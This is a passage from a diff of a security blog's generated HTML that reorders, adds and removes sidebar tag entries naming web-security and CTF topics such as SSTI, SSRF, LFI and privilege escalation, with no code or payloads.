         <span class="sidebar-tag-name" data-tags="无列名注入"><span class="iconfont-archer">&#xe606;</span>无列名注入</span>
     
         <span class="sidebar-tag-name" data-tags="php反射类利用"><span class="iconfont-archer">&#xe606;</span>php反射类利用</span>
-    
-        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
     
         <span class="sidebar-tag-name" data-tags="2021红明谷"><span class="iconfont-archer">&#xe606;</span>2021红明谷</span>
     
@@ -3873,27 +4278,29 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
-        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
     
         <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
     
-        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
         <span class="sidebar-tag-name" data-tags="权限提升"><span class="iconfont-archer">&#xe606;</span>权限提升</span>
     
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
     
-        <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
+        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
     
         <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
-        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
-    
-        <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
+        <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
         <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
     
         <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
+    
+        <span class="sidebar-tag-name" data-tags="红蓝对抗"><span class="iconfont-archer">&#xe606;</span>红蓝对抗</span>
     
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
     
@@ -3913,13 +4320,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
-    
         <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
     
-        <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
         <span class="sidebar-tag-name" data-tags="源码泄露"><span class="iconfont-archer">&#xe606;</span>源码泄露</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
@@ -3928,6 +4335,8 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
+    
+        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
     
         <span class="sidebar-tag-name" data-tags="XML"><span class="iconfont-archer">&#xe606;</span>XML</span>
     
@@ -3977,6 +4386,10 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="misc图像处理"><span class="iconfont-archer">&#xe606;</span>misc图像处理</span>
     
+        <span class="sidebar-tag-name" data-tags="Nginx"><span class="iconfont-archer">&#xe606;</span>Nginx</span>
+    
+        <span class="sidebar-tag-name" data-tags="LFI"><span class="iconfont-archer">&#xe606;</span>LFI</span>
+    
         <span class="sidebar-tag-name" data-tags="redis攻防"><span class="iconfont-archer">&#xe606;</span>redis攻防</span>
     
         <span class="sidebar-tag-name" data-tags="提权"><span class="iconfont-archer">&#xe606;</span>提权</span>
@@ -4007,19 +4420,19 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="文件上传漏洞"><span class="iconfont-archer">&#xe606;</span>文件上传漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="文件读取漏洞"><span class="iconfont-archer">&#xe606;</span>文件读取漏洞</span>
-    
         <span class="sidebar-tag-name" data-tags="文件包含"><span class="iconfont-archer">&#xe606;</span>文件包含</span>
     
+        <span class="sidebar-tag-name" data-tags="文件读取漏洞"><span class="iconfont-archer">&#xe606;</span>文件读取漏洞</span>
+    
         <span class="sidebar-tag-name" data-tags="无参数构造payload"><span class="iconfont-archer">&#xe606;</span>无参数构造payload</span>
+    
+        <span class="sidebar-tag-name" data-tags="神经网络"><span class="iconfont-archer">&#xe606;</span>神经网络</span>
     
         <span class="sidebar-tag-name" data-tags="红队"><span class="iconfont-archer">&#xe606;</span>红队</span>
     
         <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
     
         <span class="sidebar-tag-name" data-tags="misc_zip"><span class="iconfont-archer">&#xe606;</span>misc_zip</span>
-    
-        <span class="sidebar-tag-name" data-tags="神经网络"><span class="iconfont-archer">&#xe606;</span>神经网络</span>
     
         <span class="sidebar-tag-name" data-tags="url取反绕过"><span class="iconfont-archer">&#xe606;</span>url取反绕过</span>
     
